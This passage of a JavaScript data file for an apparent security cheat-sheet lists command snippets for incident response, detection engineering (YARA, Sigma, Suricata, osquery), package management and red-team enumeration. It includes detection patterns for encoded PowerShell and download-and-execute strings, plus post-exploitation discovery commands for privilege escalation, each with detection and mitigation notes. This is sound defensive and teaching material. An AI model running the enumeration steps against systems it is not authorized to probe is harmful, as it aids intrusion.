 danger:"Requires administrator / root.",
 team:"blue", tags:["incident-response","logs"], attack:["T1070.001"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} -MaxEvents 10 |
  Select-Object TimeCreated, @{n='ClearedBy';e={$_.Properties[1].Value}}`,
  linux:`ls -la /var/log/auth.log /var/log/secure /var/log/wtmp /var/log/btmp 2>/dev/null
echo "-- journal --"; journalctl --disk-usage 2>/dev/null`,
  mac:`ls -la /var/log/*.log /private/var/log/ 2>/dev/null | head`
 }},
{id:"ir-open-files", cat:"Incident Response & Live Triage", title:"Open files / handles of a process",
 desc:"What a suspect process has open. Windows needs Sysinternals handle.exe; lsof on mac/linux.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","triage","process"],
 code:{
  ps:`# Sysinternals handle.exe (dependency):
handle.exe -p {{PID:1234}}`,
  linux:`sudo lsof -p {{PID:1234}}`,
  mac:`sudo lsof -p {{PID:1234}}`
 }},
{id:"ir-loaded-modules", cat:"Incident Response & Live Triage", title:"Loaded modules of a process",
 desc:"DLLs / shared libraries a process has loaded — helps spot injected or unusual modules.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","triage","process"], attack:["T1055"],
 code:{
  ps:`Get-Process -Id {{PID:1234}} | Select-Object -ExpandProperty Modules | Select-Object ModuleName, FileName | Sort-Object ModuleName`,
  linux:`sudo cat /proc/{{PID:1234}}/maps | awk '{print $6}' | grep -E '[.]so' | sort -u`,
  mac:`sudo lsof -p {{PID:1234}} | grep -E 'dylib'`
 }},
{id:"ir-wmi-persistence", cat:"Incident Response & Live Triage", title:"WMI event-subscription persistence",
 desc:"List permanent WMI event subscriptions — a stealthy Windows persistence mechanism.",
 danger:"Requires administrator.",
 team:"blue", tags:["incident-response","persistence"], attack:["T1546.003"],
 code:{
  ps:`Get-WmiObject -Namespace root/subscription -Class __EventFilter | Select-Object Name, Query
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Select-Object Filter, Consumer`
 }},
{id:"ir-hosts-file", cat:"Incident Response & Live Triage", title:"Inspect the hosts file",
 desc:"Check for malicious static DNS overrides in the hosts file.",
 team:"blue", tags:["incident-response","network","quick-win"],
 code:{
  ps:`Get-Content C:/Windows/System32/drivers/etc/hosts | Where-Object { $_.Trim() -and -not $_.Trim().StartsWith('#') }`,
  cmd:`type C:\\Windows\\System32\\drivers\\etc\\hosts | findstr /v "^#"`,
  linux:`grep -vE '^[[:space:]]*(#|$)' /etc/hosts`,
  mac:`grep -vE '^[[:space:]]*(#|$)' /etc/hosts`
 }},
{id:"ir-scheduled-recent", cat:"Incident Response & Live Triage", title:"Recently created scheduled tasks",
 desc:"Scheduled tasks / cron / timers by most-recent write — catches freshly planted persistence.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","persistence","scheduling"], attack:["T1053.005"],
 code:{
  ps:`Get-ChildItem C:/Windows/System32/Tasks -Recurse -File -ErrorAction SilentlyContinue |
  Sort-Object LastWriteTime -Descending | Select-Object -First 15 FullName, LastWriteTime`,
  linux:`ls -lt /etc/cron.d /var/spool/cron/crontabs /etc/systemd/system/*.timer 2>/dev/null | head -20`,
  mac:`ls -lt /Library/LaunchDaemons ~/Library/LaunchAgents 2>/dev/null | head; crontab -l 2>/dev/null`
 }},
{id:"ir-pcap", cat:"Incident Response & Live Triage", title:"Quick packet capture",
 desc:"Capture traffic for a host to a file for later analysis. tcpdump (mac/linux); netsh trace (Windows).",
 danger:"Captures traffic to a file; run elevated. Authorized monitoring only.",
 team:"blue", tags:["incident-response","network"],
 code:{
  ps:`netsh trace start capture=yes tracefile=C:/capture.etl
Write-Host "Reproduce the activity, then: netsh trace stop"`,
  linux:`sudo tcpdump -i {{IFACE:eth0}} -w "capture_$(date +%H%M%S).pcap" host {{IP:10.0.0.5}}`,
  mac:`sudo tcpdump -i {{IFACE:en0}} -w "capture_$(date +%H%M%S).pcap" host {{IP:10.0.0.5}}`
 }},
{id:"ir-memory-acquire", cat:"Incident Response & Live Triage", title:"Acquire RAM",
 desc:"Dump physical memory for offline analysis. Needs a trusted forensic build (WinPmem / AVML / OSXPmem).",
 danger:"Needs admin/root; writes a very large file. Use a trusted, verified acquisition binary.",
 team:"blue", tags:["incident-response","memory","forensics"],
 code:{
  ps:`# WinPmem (Velocidex) — download the signed binary first:
./winpmem.exe -o C:/mem.raw`,
  linux:`sudo avml /tmp/mem.lime      # Microsoft AVML`,
  mac:`sudo osxpmem.app/osxpmem -o /tmp/mem.aff4`
 }},
{id:"ir-isolate-host", cat:"Incident Response & Live Triage", title:"Network isolation (containment)",
 desc:"Cut a host off the network except a management subnet, to contain an active compromise.",
 danger:"CONTAINMENT — will drop the host's network (you may lose your own remote session). Authorized IR only; run elevated.",
 team:"blue", tags:["incident-response","containment","network"],
 code:{
  ps:`New-NetFirewallRule -DisplayName "IR-Block-Out" -Direction Outbound -Action Block -RemoteAddress Any
New-NetFirewallRule -DisplayName "IR-Allow-Mgmt" -Direction Outbound -Action Allow -RemoteAddress {{MGMT:10.0.0.0/24}}`,
  linux:`sudo nft add table inet ir 2>/dev/null
sudo nft 'add chain inet ir out { type filter hook output priority 0; policy drop; }'
sudo nft add rule inet ir out ip daddr {{MGMT:10.0.0.0/24}} accept`,
  mac:`printf 'block all\\npass out to {{MGMT:10.0.0.0/24}}\\n' | sudo pfctl -ef -`
 }},
{id:"ir-kill-by-conn", cat:"Incident Response & Live Triage", title:"Kill processes talking to an IP",
 desc:"Find and terminate the process(es) with a connection to a suspect address.",
 danger:"Force-terminates processes — unsaved data is lost. Confirm before running; needs elevation.",
 team:"blue", tags:["incident-response","containment","process"],
 code:{
  ps:`$ip="{{IP:203.0.113.10}}"
Get-NetTCPConnection -RemoteAddress $ip | Select-Object -Expand OwningProcess -Unique |
  ForEach-Object { Get-Process -Id $_ | Select-Object Name, Id; Stop-Process -Id $_ -Force }`,
  linux:`IP={{IP:203.0.113.10}}
sudo ss -tunp | grep "$IP"   # note the pid=NNNN, then: sudo kill -9 <PID>`,
  mac:`IP={{IP:203.0.113.10}}
sudo lsof -nP -iTCP | grep "$IP"   # note the PID, then: sudo kill -9 <PID>`
 }},
{id:"ir-timeline", cat:"Incident Response & Live Triage", title:"File MACB timeline",
 desc:"List files under a path sorted by time to reconstruct activity around an incident.",
 team:"blue", tags:["incident-response","forensics","timeline"],
 code:{
  ps:`Get-ChildItem {{PATH:C:/inetpub}} -Recurse -File -ErrorAction SilentlyContinue |
  Sort-Object LastWriteTime | Select-Object LastWriteTime, CreationTime, FullName`,
  linux:`find {{PATH:/var/www}} -type f -printf '%TY-%Tm-%Td %TH:%TM  %p\\n' 2>/dev/null | sort`,
  mac:`find {{PATH:/var/www}} -type f -exec stat -f '%Sm %N' {} + 2>/dev/null | sort`
 }},
{id:"ir-clipboard", cat:"Incident Response & Live Triage", title:"Capture the clipboard",
 desc:"Grab current clipboard contents — a volatile artifact worth collecting early.",
 team:"blue", tags:["incident-response","triage","quick-win"],
 code:{
  ps:`Get-Clipboard`,
  mac:`pbpaste`,
  linux:`xclip -selection clipboard -o 2>/dev/null || wl-paste 2>/dev/null`
 }},

/* ================= DETECTION ENGINEERING ================= */
{id:"det-yara-scan", cat:"Detection Engineering", title:"YARA: scan a path with a ruleset",
 desc:"Recursively scan files for matches against a YARA ruleset. Requires yara.",
 team:"blue", tags:["detection","yara","forensics"],
 code:{
  linux:`yara -r {{RULE:/opt/rules/malware.yar}} {{PATH:/home}}`,
  mac:`yara -r {{RULE:/opt/rules/malware.yar}} {{PATH:/Users}}`
 }},
{id:"det-yara-rule", cat:"Detection Engineering", title:"YARA: write & run a rule",
 desc:"Author a minimal YARA rule (PE header + suspicious strings) and scan with it.",
 team:"blue", tags:["detection","yara"],
 code:{
  linux:`cat > sample.yar <<'EOF'
rule suspicious_dropper
{
  strings:
    $mz = { 4D 5A }                 // PE 'MZ' header
    $s1 = "cmd.exe /c" ascii nocase
    $s2 = "powershell -enc" ascii nocase
  condition:
    $mz at 0 and any of ($s*)
}
EOF
yara -r sample.yar {{PATH:/tmp}}`,
  mac:`cat > sample.yar <<'EOF'
rule suspicious_dropper
{
  strings:
    $mz = { 4D 5A }
    $s1 = "cmd.exe /c" ascii nocase
    $s2 = "powershell -enc" ascii nocase
  condition:
    $mz at 0 and any of ($s*)
}
EOF
yara -r sample.yar {{PATH:/tmp}}`
 }},
{id:"det-yara-proc", cat:"Detection Engineering", title:"YARA: scan process memory",
 desc:"Scan a running process's memory against a ruleset (Linux). Requires yara + root.",
 danger:"Run elevated.",
 team:"blue", tags:["detection","yara","memory"], attack:["T1055"],
 code:{
  linux:`sudo yara {{RULE:/opt/rules/malware.yar}} /proc/{{PID:1234}}/mem 2>/dev/null   # or: yara -p {{PID:1234}} rule.yar`
 }},
{id:"det-sigma-rule", cat:"Detection Engineering", title:"Sigma: a portable detection rule",
 desc:"A Sigma rule (backend-agnostic YAML) — example: encoded PowerShell process creation.",
 team:"blue", tags:["detection","sigma","logs"], attack:["T1059.001"],
 code:{
  linux:`cat > enc_powershell.yml <<'EOF'
title: Encoded PowerShell Command
logsource:
  product: windows
  category: process_creation
detection:
  sel:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - ' -enc '
      - ' -EncodedCommand '
  condition: sel
level: high
EOF
echo "Convert it to your SIEM with sigma-cli (see the next entry)."`
 }},
{id:"det-sigma-convert", cat:"Detection Engineering", title:"Sigma: convert to a SIEM query",
 desc:"Translate a Sigma rule into your platform's query language. Requires sigma-cli (pip install sigma-cli).",
 team:"blue", tags:["detection","sigma"],
 code:{
  linux:`sigma convert -t splunk {{RULE:enc_powershell.yml}}   # backends: splunk, esql, lucene, ...`,
  mac:`sigma convert -t splunk {{RULE:enc_powershell.yml}}`
 }},
{id:"det-suricata-rule", cat:"Detection Engineering", title:"Suricata: write & test a signature",
 desc:"Author a Suricata/Snort rule and run it against a pcap. Requires suricata.",
 team:"blue", tags:["detection","suricata","network"],
 code:{
  linux:`cat > local.rules <<'EOF'
alert http $HOME_NET any -> any any (msg:"Cleartext login POST"; flow:to_server; http.method; content:"POST"; http.uri; content:"/login"; sid:1000001; rev:1;)
EOF
suricata -r {{PCAP:traffic.pcap}} -S local.rules -l .
cat fast.log`
 }},
{id:"det-suricata-run", cat:"Detection Engineering", title:"Suricata: run against a pcap",
 desc:"Replay a capture through an existing ruleset and read the alerts. Requires suricata.",
 team:"blue", tags:["detection","suricata","network"],
 code:{
  linux:`suricata -r {{PCAP:traffic.pcap}} -S {{RULES:/etc/suricata/rules/suricata.rules}} -l .
tail -n 40 fast.log`
 }},
{id:"det-suricata-update", cat:"Detection Engineering", title:"Suricata: update ET rules",
 desc:"Fetch/refresh Emerging Threats rules. Requires suricata-update.",
 danger:"Writes rule files; run with appropriate privileges.",
 team:"blue", tags:["detection","suricata"],
 code:{
  linux:`sudo suricata-update && sudo suricatasc -c reload-rules 2>/dev/null`
 }},
{id:"det-suricata-eve", cat:"Detection Engineering", title:"Suricata: summarize eve.json alerts",
 desc:"Roll up alert signatures and talkers from Suricata's eve.json. Requires jq.",
 team:"blue", tags:["detection","suricata","logs"],
 code:{
  linux:`jq -r 'select(.event_type=="alert") | "\\(.alert.signature)  \\(.src_ip) -> \\(.dest_ip)"' eve.json | sort | uniq -c | sort -rn | head`
 }},
{id:"det-zeek-pcap", cat:"Detection Engineering", title:"Zeek: analyze a pcap",
 desc:"Generate Zeek logs from a capture and summarize connections. Requires zeek.",
 team:"blue", tags:["detection","zeek","network"],
 code:{
  linux:`zeek -r {{PCAP:traffic.pcap}}
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | sort | uniq -c | sort -rn | head`,
  mac:`zeek -r {{PCAP:traffic.pcap}}
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | sort | uniq -c | sort -rn | head`
 }},
{id:"det-zeek-live", cat:"Detection Engineering", title:"Zeek: run live on an interface",
 desc:"Continuously produce Zeek logs from live traffic. Requires zeek + root.",
 danger:"Captures traffic; run elevated. Authorized monitoring only.",
 team:"blue", tags:["detection","zeek","network"],
 code:{
  linux:`sudo zeek -i {{IFACE:eth0}} -C`
 }},
{id:"det-zeek-iocs", cat:"Detection Engineering", title:"Zeek: extract DNS / HTTP IOCs",
 desc:"Pull the top DNS queries and HTTP hosts from Zeek logs for review (zeek-cut).",
 team:"blue", tags:["detection","zeek","dns"],
 code:{
  linux:`echo "== DNS =="; zeek-cut query < dns.log | sort | uniq -c | sort -rn | head
echo "== HTTP hosts =="; zeek-cut host < http.log | sort | uniq -c | sort -rn | head`,
  mac:`echo "== DNS =="; zeek-cut query < dns.log | sort | uniq -c | sort -rn | head
echo "== HTTP hosts =="; zeek-cut host < http.log | sort | uniq -c | sort -rn | head`
 }},
{id:"det-osquery-run", cat:"Detection Engineering", title:"osquery: ad-hoc query",
 desc:"Query the endpoint as a SQL database. Requires osquery (osqueryi). Cross-platform.",
 team:"blue", tags:["detection","osquery"],
 code:{
  ps:`osqueryi "SELECT hostname, cpu_brand, physical_memory FROM system_info;"`,
  linux:`osqueryi "SELECT hostname, cpu_brand, physical_memory FROM system_info;"`,
  mac:`osqueryi "SELECT hostname, cpu_brand, physical_memory FROM system_info;"`
 }},
{id:"det-osquery-deleted-bin", cat:"Detection Engineering", title:"osquery: processes with no on-disk binary",
 desc:"Running processes whose executable was deleted — a fileless / dropped-payload indicator.",
 team:"blue", tags:["detection","osquery","process"], attack:["T1620"],
 code:{
  ps:`osqueryi "SELECT pid, name, path FROM processes WHERE on_disk = 0;"`,
  linux:`osqueryi "SELECT pid, name, path FROM processes WHERE on_disk = 0;"`,
  mac:`osqueryi "SELECT pid, name, path FROM processes WHERE on_disk = 0;"`
 }},
{id:"det-osquery-listening", cat:"Detection Engineering", title:"osquery: listening ports + process",
 desc:"Join listening sockets to their owning process via osquery.",
 team:"blue", tags:["detection","osquery","network"],
 code:{
  ps:`osqueryi "SELECT p.pid, p.name, l.address, l.port FROM listening_ports l JOIN processes p ON l.pid = p.pid;"`,
  linux:`osqueryi "SELECT p.pid, p.name, l.address, l.port FROM listening_ports l JOIN processes p ON l.pid = p.pid;"`,
  mac:`osqueryi "SELECT p.pid, p.name, l.address, l.port FROM listening_ports l JOIN processes p ON l.pid = p.pid;"`
 }},
{id:"det-osquery-autostart", cat:"Detection Engineering", title:"osquery: autostart / persistence",
 desc:"Enumerate persistence points via osquery (startup items, scheduled tasks, crontab).",
 team:"blue", tags:["detection","osquery","persistence"], attack:["T1547"],
 code:{
  ps:`osqueryi "SELECT name, path, source FROM startup_items;"
osqueryi "SELECT name, action, path FROM scheduled_tasks;"`,
  linux:`osqueryi "SELECT command, path, minute, hour FROM crontab;"`,
  mac:`osqueryi "SELECT name, path, source FROM startup_items;"`
 }},
{id:"det-osquery-fim", cat:"Detection Engineering", title:"osquery: file hashes (integrity)",
 desc:"Hash sensitive files with osquery for integrity monitoring / baselining.",
 team:"blue", tags:["detection","osquery","forensics"],
 code:{
  linux:`osqueryi "SELECT path, sha256 FROM hash WHERE path IN ('/etc/passwd','/etc/hosts','/etc/ssh/sshd_config');"`,
  mac:`osqueryi "SELECT path, sha256 FROM hash WHERE path IN ('/etc/passwd','/etc/hosts','/etc/ssh/sshd_config');"`
 }},
{id:"det-sysmon-install", cat:"Detection Engineering", title:"Sysmon: deploy with a config",
 desc:"Install Sysmon for rich process/network/registry telemetry. Sysmon (Sysinternals) + a curated config (e.g. SwiftOnSecurity or olafhartong).",
 danger:"Installs a kernel driver; run elevated. Test the config before wide deployment.",
 team:"blue", tags:["detection","sysmon","logs"],
 code:{
  ps:`./Sysmon64.exe -accepteula -i {{CONFIG:sysmonconfig.xml}}
# update the config later without reinstalling:
./Sysmon64.exe -c {{CONFIG:sysmonconfig.xml}}`
 }},
{id:"det-sysmon-query", cat:"Detection Engineering", title:"Sysmon: query high-value events",
 desc:"Pull recent Sysmon events by ID. Key IDs: 1 proc, 3 net, 7 image-load, 8 remote-thread, 11 file-create, 13 reg-set, 22 DNS.",
 danger:"Requires administrator; Sysmon must be installed.",
 team:"blue", tags:["detection","sysmon","logs"], attack:["T1059"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id={{ID:1}}} -MaxEvents 20 |
  Select-Object TimeCreated, Message`
 }},
{id:"det-4688-cmdline", cat:"Detection Engineering", title:"Windows: process creation w/ command line (4688)",
 desc:"Enable command-line auditing, then hunt process-creation events. Native.",
 danger:"Enabling audit policy requires administrator.",
 team:"blue", tags:["detection","logs","process"], attack:["T1059"],
 code:{
  ps:`# one-time enable: auditpol /set /subcategory:"Process Creation" /success:enable
#   plus 'Include command line in process creation events' (GPO/registry)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 20 |
  Select-Object TimeCreated, @{n='NewProcess';e={$_.Properties[5].Value}}, @{n='CommandLine';e={$_.Properties[8].Value}}`
 }},
{id:"det-powershell-scriptblock", cat:"Detection Engineering", title:"Windows: PowerShell script-block hunt (4104)",
 desc:"Search PowerShell Operational logs for encoded/obfuscated script blocks. Script-block logging must be on.",
 danger:"Requires administrator.",
 team:"blue", tags:["detection","logs"], attack:["T1059.001"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 50 |
  Where-Object { $_.Message -match 'FromBase64String|-enc|IEX|DownloadString|Invoke-Expression' } |
  Select-Object TimeCreated, Message`
 }},
{id:"det-auditd-rule", cat:"Detection Engineering", title:"Linux: auditd watch",
 desc:"Add auditd rules to watch a sensitive file and log every execve. Requires auditd.",
 danger:"Modifies audit configuration; run elevated.",
 team:"blue", tags:["detection","logs","linux"], attack:["T1053"],
 code:{
  linux:`sudo auditctl -w /etc/passwd -p wa -k passwd_changes
sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_log
sudo ausearch -k exec_log | tail`
 }},

/* ================= PACKAGE MANAGERS ================= */
{id:"pkg-search", cat:"Package Managers", title:"Search for a package",
 desc:"Find a package by name/keyword. Windows: winget/choco; macOS: brew; Linux: apt/dnf/pacman.",
 tags:["package-manager"],
 code:{
  ps:`winget search {{NAME:7zip}}`,
  cmd:`choco search {{NAME:7zip}}`,
  mac:`brew search {{NAME:wget}}`,
  linux:`apt-cache search {{NAME:wget}}   # dnf: dnf search {{NAME:wget}}   pacman: pacman -Ss {{NAME:wget}}`
 }},
{id:"pkg-install", cat:"Package Managers", title:"Install a package",
 desc:"Install a package from the default repositories.",
 danger:"Installs software; needs admin/root.",
 tags:["package-manager"],
 code:{
  ps:`winget install {{NAME:Git.Git}}`,
  cmd:`choco install {{NAME:git}} -y`,
  mac:`brew install {{NAME:git}}`,
  linux:`sudo apt install {{NAME:git}}   # dnf: sudo dnf install {{NAME:git}}   pacman: sudo pacman -S {{NAME:git}}`
 }},
{id:"pkg-remove", cat:"Package Managers", title:"Uninstall a package",
 desc:"Remove an installed package.",
 danger:"Removes software; needs admin/root.",
 tags:["package-manager"],
 code:{
  ps:`winget uninstall {{NAME:Git.Git}}`,
  cmd:`choco uninstall {{NAME:git}} -y`,
  mac:`brew uninstall {{NAME:git}}`,
  linux:`sudo apt remove {{NAME:git}}   # dnf: sudo dnf remove {{NAME:git}}   pacman: sudo pacman -R {{NAME:git}}`
 }},
{id:"pkg-upgrade-all", cat:"Package Managers", title:"Upgrade everything",
 desc:"Update repository metadata and upgrade all installed packages.",
 danger:"Upgrades installed software and may restart services. Needs admin/root.",
 tags:["package-manager"],
 code:{
  ps:`winget upgrade --all`,
  cmd:`choco upgrade all -y`,
  mac:`brew update && brew upgrade`,
  linux:`sudo apt update && sudo apt upgrade -y   # dnf: sudo dnf upgrade   pacman: sudo pacman -Syu`
 }},
{id:"pkg-list", cat:"Package Managers", title:"List installed packages",
 desc:"Enumerate installed packages and versions.",
 tags:["package-manager"],
 code:{
  ps:`winget list`,
  cmd:`choco list --local-only`,
  mac:`brew list --versions`,
  linux:`apt list --installed 2>/dev/null   # dnf: dnf list installed   pacman: pacman -Q`
 }},
{id:"pkg-info", cat:"Package Managers", title:"Show package details",
 desc:"Version, dependencies, and description for a package.",
 tags:["package-manager"],
 code:{
  ps:`winget show {{NAME:Git.Git}}`,
  mac:`brew info {{NAME:git}}`,
  linux:`apt show {{NAME:git}}   # dnf: dnf info {{NAME:git}}   pacman: pacman -Si {{NAME:git}}`
 }},
{id:"pkg-outdated", cat:"Package Managers", title:"List upgradable packages",
 desc:"Show which installed packages have newer versions available.",
 tags:["package-manager"],
 code:{
  ps:`winget upgrade`,
  mac:`brew outdated`,
  linux:`apt list --upgradable 2>/dev/null   # dnf: dnf check-update   pacman: pacman -Qu`
 }},
{id:"pkg-clean", cat:"Package Managers", title:"Clean package caches",
 desc:"Reclaim disk space by removing cached downloads/old versions.",
 danger:"Deletes cached package files.",
 tags:["package-manager"],
 code:{
  mac:`brew cleanup`,
  linux:`sudo apt clean && sudo apt autoclean   # dnf: sudo dnf clean all`
 }},
{id:"pkg-autoremove", cat:"Package Managers", title:"Remove orphaned dependencies",
 desc:"Remove packages that were installed as dependencies and are no longer needed.",
 danger:"Removes packages; review the list before confirming.",
 tags:["package-manager"],
 code:{
  mac:`brew autoremove`,
  linux:`sudo apt autoremove   # dnf: sudo dnf autoremove   pacman: pacman -Qdtq | sudo pacman -Rns -`
 }},
{id:"pkg-owns-file", cat:"Package Managers", title:"Which package owns a file",
 desc:"Map a file on disk back to the package that installed it (Linux).",
 tags:["package-manager","linux"],
 code:{
  linux:`dpkg -S {{FILE:/usr/bin/ssh}}   # rpm: rpm -qf {{FILE:/usr/bin/ssh}}`
 }},
{id:"pkg-files", cat:"Package Managers", title:"List a package's files",
 desc:"Show every file a package placed on disk.",
 tags:["package-manager"],
 code:{
  mac:`brew list {{NAME:git}}`,
  linux:`dpkg -L {{NAME:openssh-client}}   # rpm: rpm -ql {{NAME:openssh}}`
 }},
{id:"pkg-hold", cat:"Package Managers", title:"Pin / hold a package version",
 desc:"Prevent a package from being upgraded.",
 danger:"Blocks security updates for the held package until you unhold it.",
 tags:["package-manager"],
 code:{
  ps:`winget pin add {{NAME:Git.Git}}   # remove: winget pin remove {{NAME:Git.Git}}`,
  mac:`brew pin {{NAME:node}}   # unpin: brew unpin {{NAME:node}}`,
  linux:`sudo apt-mark hold {{NAME:nginx}}   # unhold: sudo apt-mark unhold {{NAME:nginx}} ; dnf: dnf versionlock add`
 }},
{id:"pkg-verify", cat:"Package Managers", title:"Verify installed package integrity",
 desc:"Check installed files against the package database for tampering/corruption (Linux).",
 danger:"Requires elevation to read all package files.",
 tags:["package-manager","linux","detection"],
 code:{
  linux:`sudo debsums -c 2>/dev/null   # RPM: rpm -Va | head`
 }},
{id:"pkg-history", cat:"Package Managers", title:"Recent install / upgrade history",
 desc:"Review recent package changes on the system.",
 tags:["package-manager"],
 code:{
  linux:`grep -E ' install | upgrade | remove ' /var/log/dpkg.log 2>/dev/null | tail -20   # dnf: dnf history`,
  mac:`ls -lt "$(brew --cellar)" 2>/dev/null | head   # Homebrew keeps no global log`
 }},
{id:"pkg-download", cat:"Package Managers", title:"Download a package without installing",
 desc:"Fetch a package (and optionally its deps) for offline use or inspection.",
 tags:["package-manager"],
 code:{
  mac:`brew fetch {{NAME:git}}`,
  linux:`apt download {{NAME:git}}   # with deps: sudo apt install --download-only {{NAME:git}}`
 }},
{id:"pkg-winget-export", cat:"Package Managers", title:"Export / import installed list (Windows)",
 desc:"Snapshot installed winget packages to a file and replay on another machine.",
 tags:["package-manager","windows","automation"],
 code:{
  ps:`winget export -o packages.json
# on a new machine: winget import -i packages.json`
 }},
{id:"pkg-scoop", cat:"Package Managers", title:"Scoop (user-scope, Windows)",
 desc:"Scoop installs Windows CLI tools without admin. Requires scoop (scoop.sh).",
 tags:["package-manager","windows"],
 code:{
  ps:`scoop install {{NAME:ripgrep}}   # search: scoop search {{NAME:ripgrep}} ; update all: scoop update *`
 }},
{id:"pkg-pip", cat:"Package Managers", title:"pip: install / list Python packages",
 desc:"Manage Python packages with pip. Prefer a virtual environment over system-wide installs.",
 tags:["package-manager"],
 code:{
  ps:`python -m pip install {{PKG:requests}}
python -m pip list`,
  mac:`python3 -m pip install {{PKG:requests}}
python3 -m pip list`,
  linux:`python3 -m pip install {{PKG:requests}}
python3 -m pip list`
 }},
{id:"pkg-pip-outdated", cat:"Package Managers", title:"pip: list outdated packages",
 desc:"Show installed Python packages that have newer versions.",
 tags:["package-manager"],
 code:{
  ps:`python -m pip list --outdated`,
  mac:`python3 -m pip list --outdated`,
  linux:`python3 -m pip list --outdated`
 }},
{id:"pkg-npm-global", cat:"Package Managers", title:"npm: global packages",
 desc:"Install, list, and check global Node packages. Requires node/npm.",
 tags:["package-manager"],
 code:{
  ps:`npm install -g {{PKG:npm}}   # list: npm list -g --depth=0 ; outdated: npm outdated -g`,
  mac:`npm install -g {{PKG:npm}}   # list: npm list -g --depth=0 ; outdated: npm outdated -g`,
  linux:`sudo npm install -g {{PKG:npm}}   # list: npm list -g --depth=0`
 }},

/* ================= ENUMERATION ================= */
{id:"enum-whoami-priv", cat:"Enumeration", title:"Current user, groups & privileges",
 desc:"First situational-awareness step after access: who am I, my groups, and my rights.",
 danger:"Post-exploitation enumeration — authorized engagements only.",
 team:"red", tags:["enumeration","account"], attack:["T1033"],
 detect:"Discovery binaries (whoami/id) are low-signal alone; EDR flags them inside rapid discovery bursts; Sysmon 1 / 4688.",
 mitigate:"Least privilege limits what enumeration reveals; EDR discovery analytics.",
 code:{
  ps:`whoami /all`,
  cmd:`whoami /priv`,
  mac:`id; groups`,
  linux:`id; sudo -n true 2>/dev/null && echo "passwordless sudo available"`
 }},
{id:"enum-system-info", cat:"Enumeration", title:"OS build & patch level",
 desc:"OS version, build, and architecture for exploit/privilege matching.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration"], attack:["T1082"],
 detect:"systeminfo/uname execution; correlated discovery activity in EDR.",
 mitigate:"Patch promptly so version disclosure yields no usable exploit; EDR analytics.",
 code:{
  ps:`systeminfo`,
  mac:`sw_vers; uname -a`,
  linux:`uname -a; cat /etc/os-release 2>/dev/null; hostnamectl 2>/dev/null`
 }},
{id:"enum-network-local", cat:"Enumeration", title:"Local network view",
 desc:"Interfaces, routes, ARP neighbors, and active connections from the host's perspective.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","network"], attack:["T1016"],
 detect:"ipconfig/route/arp/netstat sequence; EDR discovery correlation.",
 mitigate:"Segmentation limits what neighbors reveal; monitor discovery sequences.",
 code:{
  ps:`ipconfig /all; route print; arp -a; netstat -ano`,
  mac:`ifconfig; netstat -rn; arp -an; netstat -an`,
  linux:`ip a; ip route; ip neigh; ss -tunap`
 }},
{id:"enum-processes", cat:"Enumeration", title:"Processes & owners",
 desc:"Running processes with owners — spot AV/EDR, interesting services, and credential-bearing apps.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","process"], attack:["T1057"],
 detect:"Process listing is low-signal; suspicious when paired with credential access.",
 mitigate:"EDR; restrict tooling; least privilege.",
 code:{
  ps:`Get-Process -IncludeUserName | Sort-Object CPU -Descending | Select-Object -First 30`,
  mac:`ps auxww`,
  linux:`ps auxww`
 }},
{id:"enum-installed-software", cat:"Enumeration", title:"Installed software & versions",
 desc:"Enumerate installed applications for vulnerable-version matching.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration"], attack:["T1518"],
 detect:"Uninstall-registry / package-db reads; EDR discovery analytics.",
 mitigate:"Patch management; remove unused software.",
 code:{
  ps:`Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Where-Object DisplayName | Select-Object DisplayName, DisplayVersion | Sort-Object DisplayName`,
  mac:`ls /Applications; brew list --versions 2>/dev/null`,
  linux:`dpkg -l 2>/dev/null || rpm -qa`
 }},
{id:"enum-services-weak", cat:"Enumeration", title:"Weak service paths (Windows)",
 desc:"Services with unquoted paths containing spaces — a classic local privilege-escalation vector.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","privesc"], attack:["T1574.009"],
 detect:"Enumeration of Win32_Service; abuse would show a service starting an unexpected binary.",
 mitigate:"Quote all service ImagePaths; restrict permissions on service dirs.",
 code:{
  ps:`Get-CimInstance Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '^"' -and $_.PathName -notmatch 'Windows' } | Select-Object Name, PathName, StartName`
 }},
{id:"enum-sudo", cat:"Enumeration", title:"Sudo rights (Linux/macOS)",
 desc:"List what the current user may run via sudo — a top privilege-escalation path.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","privesc"], attack:["T1033"],
 detect:"sudo -l invocation appears in auth logs / sudo logs.",
 mitigate:"Minimal, specific sudo rules; no NOPASSWD on shells/interpreters; monitor sudo logs.",
 code:{
  linux:`sudo -l 2>/dev/null`,
  mac:`sudo -l 2>/dev/null`
 }},
{id:"enum-suid", cat:"Enumeration", title:"SUID / SGID binaries (Linux/macOS)",
 desc:"Find set-uid/set-gid binaries that may allow privilege escalation (check against GTFOBins).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","privesc"], attack:["T1548.001"],
 detect:"A recursive find across the filesystem is visible to auditd (execve of find) and file-access telemetry.",
 mitigate:"Remove unnecessary SUID bits; monitor for new SUID files; mount noexec/nosuid where possible.",
 code:{
